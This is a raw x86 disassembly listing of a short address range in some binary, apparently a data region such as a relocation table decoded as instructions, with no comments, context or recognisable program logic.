  412655:	cmp    al,0xf2
  412657:	cmp    al,0xf8
  412659:	cmp    al,0xfe
  41265b:	cmp    al,0x3
  41265d:	cmp    eax,0x3d0f3d09
  412662:	adc    eax,0x223d1c3d
  412667:	cmp    eax,0x3d2e3d28
  41266c:	xor    edi,DWORD PTR ds:0x3d3f3d39
  412672:	inc    ebp
  412673:	cmp    eax,0x3d523d4c
  412678:	pop    eax
  412679:	cmp    eax,0x3d633d5e
  41267e:	imul   edi,DWORD PTR ds:0x3d7d3d6f,0x3d9a3d94
  412688:	lods   al,BYTE PTR ds:[esi]
  412689:	cmp    eax,0x3de63dcd
  41268e:	(bad)  
  41268f:	cmp    eax,0x3e313e18
  412694:	push   edi
  412695:	ds pop ebp
  412697:	test   BYTE PTR ds:[esi],bh
  41269a:	xchg   esp,eax
  41269b:	ds popf 
  41269d:	mov    ds:0xb23eab3e,eax
  4126a3:	xlat   BYTE PTR ds:[ebx]
  4126a5:	ds jecxz 0x4126e6
  4126a8:	(bad)  
  4126aa:	push   ebx
  4126ab:	aas    
  4126ac:	jns    0x4126ed
  4126ae:	stos   BYTE PTR es:[edi],al
  4126af:	aas    
  4126b0:	enter  0xfb3f,0x3f
  4126b4:	add    BYTE PTR [eax+0x1d00000],al
  4126ba:	add    BYTE PTR [eax],al
  4126bc:	inc    esi
  4126bd:	xor    BYTE PTR [eax+esi*1+0x30e030af],al
  4126c4:	(bad)  
  4126c5:	xor    BYTE PTR [ecx],dh
  4126c7:	xor    DWORD PTR [edx+0x31],esi
  4126ca:	xor    DWORD PTR [ecx],0xffffff96
  4126cd:	xor    DWORD PTR [ecx+esi*1+0x31b331a7],ebx
  4126d4:	mov    esi,0xda31cc31
  4126d9:	xor    edi,esi
  4126db:	xor    DWORD PTR [ecx],eax
  4126dd:	xor    al,BYTE PTR [esi]
  4126df:	xor    bl,BYTE PTR [ecx]
  4126e1:	xor    ah,BYTE PTR [ebx]
  4126e3:	xor    dl,BYTE PTR [edi+0x32]
  4126e6:	popa   
  4126e7:	xor    ah,BYTE PTR [esi+0x32]
  4126ea:	jns    0x41271e
  4126ec:	lea    esi,[edx]
  4126ee:	mov    bh,0x32
  4126f0:	shl    DWORD PTR [edx],0xc6
  4126f3:	xor    bl,cl
  4126f5:	xor    bh,cl
  4126f7:	xor    ah,BYTE PTR [edi]
  4126f9:	xor    esi,DWORD PTR [ecx]
  4126fb:	xor    esi,DWORD PTR [esi]
  4126fd:	xor    ecx,DWORD PTR [ecx+0x33]
  412700:	push   ecx
  412701:	xor    eax,DWORD PTR [ebx+esi*1+0x33a83395]
  412708:	scas   al,BYTE PTR es:[edi]
  412709:	xor    edi,DWORD PTR [ecx-0x39cc40cd]
  41270f:	xor    edx,ecx
  412711:	xor    ebx,edi
  412713:	xor    ebp,ebp
  412715:	xor    eax,DWORD PTR [ebx]
  412717:	xor    al,0xd
  412719:	xor    al,0x1d
  41271b:	xor    al,0x23
  41271d:	xor    al,0x2f
  41271f:	xor    al,0x35
  412721:	xor    al,0x3a
  412723:	xor    al,0x43
  412725:	xor    al,0x4c
  412727:	xor    al,0x53
  412729:	xor    al,0x58
  41272b:	xor    al,0x61
  41272d:	xor    al,0x66
  41272f:	xor    al,0x6c
  412731:	xor    al,0x87
  412733:	xor    al,0x91
  412735:	xor    al,0x96
  412737:	xor    al,0xa6
  412739:	xor    al,0xae
  41273b:	xor    al,0xd7
  41273d:	xor    al,0xf1
  41273f:	xor    al,0x17
  412741:	xor    eax,0x35263521
  412746:	cmp    DWORD PTR ds:0x358c3556,esi
  41274c:	popf   
  41274d:	xor    eax,0x35b635b0
  412752:	shl    DWORD PTR ds:0x35d835cd,0xe6
  412759:	xor    eax,0x361735f4
  41275e:	and    DWORD PTR [esi],esi
  412760:	es cmp DWORD PTR ss:[esi],esi
  412764:	inc    esp
  412765:	ss ja  0x41279e
  412768:	xor    DWORD PTR [esi],0x36993686
  41276e:	stos   BYTE PTR es:[edi],al
  41276f:	xlat   BYTE PTR ss:[ebx]
  412771:	ss loope 0x4127aa
  412774:	out    0x36,al
  412776:	stc    
  412777:	or     dh,BYTE PTR ss:[edi]
  41277a:	cmp    eax,0x61374e37
  41277f:	aaa    
  412780:	addr16 aaa 
  412782:	jb     0x4127bb
  412784:	jle    0x4127bd
  412786:	mov    DWORD PTR [edi],esi
  412788:	xchg   edi,eax
  412789:	aaa    
  41278a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41278b:	aaa    
  41278c:	(bad)  
  41278d:	aaa    
  41278e:	shl    DWORD PTR [edi],1
  412790:	(bad)  
  412791:	aaa    
  412792:	jmp    0x27791ece
  412797:	cmp    BYTE PTR [ecx],dh
  412799:	cmp    BYTE PTR [esi],dh
  41279b:	cmp    BYTE PTR [ecx+0x38],cl
  41279e:	pusha  
  41279f:	cmp    BYTE PTR [edi-0x69c76ec8],al
  4127a5:	cmp    BYTE PTR [ecx-0x18c74ec8],ch
  4127ab:	cmp    bl,dh
  4127ad:	cmp    bl,bh
  4127af:	cmp    BYTE PTR ds:0x2c392739,bl
  4127b5:	cmp    DWORD PTR [esi],esi
  4127b7:	cmp    DWORD PTR [ebp+0x39],eax
  4127ba:	dec    edi
  4127bb:	cmp    DWORD PTR [esi+0x39],esp
  4127be:	jno    0x4127f9
  4127c0:	xchg   DWORD PTR [ecx],edi
  4127c2:	mov    ?,WORD PTR [ecx]
  4127c4:	xchg   ebp,eax
  4127c5:	cmp    DWORD PTR [esi-0x1fc631c7],edi
  4127cb:	cmp    eax,ebp
  4127cd:	cmp    esi,ebp
  4127cf:	cmp    edx,edi
  4127d1:	cmp    DWORD PTR [ecx],eax
  4127d3:	cmp    cl,BYTE PTR ds:0x393a1f3a
  4127d9:	cmp    al,BYTE PTR [edx+0x3a]
  4127dc:	dec    ecx
  4127dd:	cmp    bh,BYTE PTR [esi+0x3a]
  4127e0:	fdivr  DWORD PTR [edx]
  4127e2:	add    bh,BYTE PTR [ebx]
  4127e4:	inc    edi
  4127e5:	cmp    esp,DWORD PTR [ebx+0x3b]
  4127e8:	jge    0x412825
  4127ea:	lea    edi,[ebx]
  4127ec:	popf   
  4127ed:	cmp    ebp,DWORD PTR [eax-0x43c44ec5]
  4127f3:	cmp    ecx,edx
  4127f5:	cmp    esp,esp
  4127f7:	cmp    esi,ecx
  4127f9:	cmp    esp,DWORD PTR ds:0x383c323c
  4127ff:	cmp    al,0x40
  412801:	cmp    al,0x46
  412803:	cmp    al,0x5f
  412805:	cmp    al,0x73
  412807:	cmp    al,0x98
  412809:	cmp    al,0xbd
  41280b:	cmp    al,0xe9
  41280d:	cmp    al,0x8
  41280f:	cmp    eax,0x3d203d14
  412814:	cmp    BYTE PTR ds:0x3d4a3d44,bh
  41281a:	push   edi
  41281b:	cmp    eax,0x3d763d6d
  412820:	cmp    BYTE PTR ds:0x3d933d89,0x9f
  412827:	cmp    eax,0x3dac3da5
  41282c:	mov    ch,0x3d
  41282e:	mov    ebx,0xc93dc33d
  412833:	cmp    eax,0x3dde3dd6
  412838:	in     al,0x3d
  41283a:	add    DWORD PTR [esi],edi
  41283c:	push   es
  41283d:	ds or  al,0x3e
  412840:	adc    DWORD PTR [esi],edi
  412842:	push   ss
  412843:	sbb    edi,DWORD PTR ds:[esi]
  412846:	and    BYTE PTR [esi],bh
  412848:	es ds cs ds push edx
  41284d:	imul   edi,DWORD PTR ds:[esi],0x3e9e3e86
  412854:	mov    ch,0x3e
  412856:	mov    ebp,0xcb3ec63e
  41285b:	sar    BYTE PTR ds:[esi],1
  41285e:	out    0x3e,al
  412860:	in     al,dx
  412861:	ds repz ds clc 
  412865:	ds add eax,0x1c3f143f
  41286b:	aas    
  41286c:	and    al,0x3f
  41286e:	cmp    bh,BYTE PTR [edi]
  412870:	inc    edx
  412871:	aas    
  412872:	dec    ecx
  412873:	aas    
  412874:	mov    BYTE PTR [edi],bh
  412876:	xchg   edx,eax
  412877:	aas    
  412878:	cwde   
  412879:	aas    
  41287a:	mov    ds:0xeb3fbd3f,al
  41287f:	aas    
  412880:	icebp  
  412881:	aas    
  412882:	sti    
  412883:	aas    
  412884:	add    BYTE PTR [eax+0x1600000],dl
  41288a:	add    BYTE PTR [eax],al
  41288c:	add    DWORD PTR [eax],esi
  41288e:	or     dh,BYTE PTR [eax]
  412890:	wrmsr  
  412892:	inc    ecx
  412893:	xor    BYTE PTR [eax+esi*1-0x6e],ah
  412897:	xor    BYTE PTR [eax-0x38cf49d0],ch
  41289d:	xor    bh,cl
  41289f:	xor    ch,ah
  4128a1:	xor    ch,ch
  4128a3:	xor    BYTE PTR [ecx],dl
  4128a5:	xor    DWORD PTR [edx],ebx
  4128a7:	xor    DWORD PTR [eax+0x31],ebp
  4128aa:	jno    0x4128dd
  4128ac:	jl     0x4128df
  4128ae:	xor    DWORD PTR [ecx],0xffffff9a
  4128b1:	xor    DWORD PTR [eax-0x53ce59cf],esp
  4128b7:	xor    DWORD PTR [edx-0x40ce47cf],esi
  4128bd:	xor    esi,eax
  4128bf:	xor    ebp,ecx
  4128c1:	xor    esp,edx
  4128c3:	xor    ebx,ebx
  4128c5:	xor    edx,esp
  4128c7:	xor    ecx,ebp
  4128c9:	xor    ecx,esi
  4128cb:	xor    ecx,edi
  4128cd:	xor    DWORD PTR [ecx],eax
  4128cf:	xor    cl,BYTE PTR ds:0x1b321632
  4128d5:	xor    ah,BYTE PTR [ecx]
  4128d7:	xor    ch,BYTE PTR [ebx]
  4128d9:	xor    dh,BYTE PTR ds:0x55324532
  4128df:	xor    bl,BYTE PTR [ebx+0x32]
  4128e2:	data16 xor ch,BYTE PTR [edx+esi*1+0x78]
  4128e7:	xor    cl,BYTE PTR [eax-0x56cd6ece]
  4128ed:	xor    ch,BYTE PTR [edi-0x44cd4ace]
  4128f3:	xor    al,cl
  4128f5:	xor    al,bh
  4128f7:	xor    cl,dh
  4128f9:	xor    dl,ch
  4128fb:	xor    bl,ah
  4128fd:	xor    ah,bl
  4128ff:	xor    ch,dl
  412901:	xor    dh,cl
  412903:	xor    bh,al
  412905:	xor    bh,dh
  412907:	xor    cl,BYTE PTR [edx]
  412909:	xor    edx,DWORD PTR ds:0x1f331a33
  41290f:	xor    esp,DWORD PTR ds:0x39332f33
  412915:	xor    ecx,DWORD PTR [ecx+0x33]
  412918:	push   edx
  412919:	xor    eax,DWORD PTR [ebp-0x56cc6ecd]
  41291f:	xor    al,0x2
  412921:	xor    eax,0x3539351d
  412926:	(bad)  
  412927:	xor    eax,0x35f035de
  41292c:	std    
  41292d:	xor    eax,0x371136f9
  412932:	pop    ss
  412933:	aaa    
  412934:	es aaa 
  412936:	xor    dh,BYTE PTR [edi]
  412938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412939:	aaa    
  41293a:	fdiv   QWORD PTR [edi]
  41293c:	dec    eax
  41293d:	cmp    BYTE PTR [ebp+0x38],cl
  412940:	pop    edi
  412941:	cmp    BYTE PTR [ebp+0x38],bh
  412944:	xchg   ecx,eax
  412945:	cmp    BYTE PTR [edi+0x74395938],dl
  41294b:	cmp    DWORD PTR [eax-0x67c670c7],eax
  412951:	cmp    DWORD PTR [ecx-0x34c649c7],esp
  412957:	cmp    eax,ebx
  412959:	cmp    eax,esp
  41295b:	cmp    DWORD PTR [edx+edi*1],eax
  41295e:	adc    bh,BYTE PTR [edx]
  412960:	sbb    eax,0x923a3a3a
  412965:	cmp    dl,BYTE PTR [edi-0x47c553c6]
  41296b:	cmp    al,ah
  41296d:	cmp    ch,BYTE PTR [ebx+edi*1+0x78]
  412971:	cmp    ebx,DWORD PTR [ebx-0x36c45bc5]
  412977:	cmp    esp,esi
  412979:	cmp    esi,DWORD PTR [ecx+0x3c]
  41297c:	cmp    DWORD PTR [ecx+eiz*4],0x3c
  412980:	mov    cl,0x3c
  412982:	sar    DWORD PTR [ecx+edx*8],0x3c
  412986:	loope  0x4129c4
  412988:	icebp  
  412989:	cmp    al,0x1
  41298b:	cmp    eax,0x3d213d11
  412990:	xor    DWORD PTR ds:0x3d513d41,edi
  412996:	popa   
  412997:	cmp    eax,0x3d813d71
  41299c:	xchg   ecx,eax
  41299d:	cmp    eax,0x3db23da1
  4129a2:	ret    0x13d
  4129a5:	ds or  eax,0x273e213e
  4129ab:	ds dec edx
  4129ad:	ds push edx
  4129af:	ds pop eax
  4129b1:	ds pop esi
  4129b3:	ds fs ds push 0x923e8a3e
  4129bb:	ds cwde 
  4129bd:	ds sahf 
  4129bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c1:	ds test al,0x3e
  4129c4:	les    edi,FWORD PTR [esi]
  4129c6:	enter  0xe43e,0x3e
  4129ca:	call   0x8802e0d
  4129cf:	aas    
  4129d0:	and    al,0x3f
  4129d2:	sub    BYTE PTR [edi],bh
  4129d4:	xor    BYTE PTR [edi],bh
  4129d6:	xor    al,0x3f
  4129d8:	push   eax
  4129d9:	aas    
  4129da:	ins    BYTE PTR es:[edi],dx
  4129db:	aas    
  4129dc:	jo     0x412a1d
  4129de:	mov    WORD PTR [edi],?
  4129e0:	nop
  4129e1:	aas    
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	add    BYTE PTR [eax+0x380000],dh
  4129ea:	add    BYTE PTR [eax],al
  4129ec:	xor    al,0x30
  4129ee:	inc    esp
  4129ef:	xor    BYTE PTR [eax+0x30],cl
  4129f2:	dec    esp
  4129f3:	xor    BYTE PTR [eax+0x30],dl
  4129f6:	push   esp
  4129f7:	xor    BYTE PTR [eax+0x30],bl
  4129fa:	pop    esp
  4129fb:	xor    BYTE PTR [eax+0x30],ah
  4129fe:	xor    BYTE PTR fs:[eax+0x30],ch
  412a02:	ins    BYTE PTR es:[edi],dx
  412a03:	xor    BYTE PTR [eax+0x30],dh
  412a06:	je     0x412a38
  412a08:	xor    BYTE PTR [eax],0x84
  412a0b:	xor    BYTE PTR [eax-0x6fcf73d0],cl
  412a11:	xor    BYTE PTR [eax+esi*1+0x38bc30b0],dl
  412a18:	sar    BYTE PTR [eax],0x0
  412a1b:	add    BYTE PTR [eax],al
  412a1d:	loopne 0x412a1f
  412a1f:	add    BYTE PTR [eax+eax*1],cl
  412a22:	add    BYTE PTR [eax],al
  412a24:	or     al,0x32
  412a26:	add    BYTE PTR [eax],al
  412a28:	add    al,dh
  412a2a:	add    BYTE PTR [eax],al
  412a2c:	sub    al,0x0
  412a2e:	add    BYTE PTR [eax],al
  412a30:	add    BYTE PTR [eax],dh
  412a32:	add    al,0x30
  412a34:	or     BYTE PTR [eax],dh
  412a36:	or     al,0x30
  412a38:	adc    BYTE PTR [eax],dh
  412a3a:	adc    al,0x30
  412a3c:	sbb    BYTE PTR [eax],dh
  412a3e:	sbb    al,0x30
  412a40:	and    BYTE PTR [eax],dh
  412a42:	and    al,0x30
  412a44:	sub    BYTE PTR [eax],dh
  412a46:	sub    al,0x30
  412a48:	xor    BYTE PTR [eax],dh
  412a4a:	xor    al,0x30
  412a4c:	cmp    BYTE PTR [eax],dh
  412a4e:	cmp    al,0x30
  412a50:	inc    eax
  412a51:	.byte 0x30
  412a52:	inc    esp
  412a53:	.byte 0x30
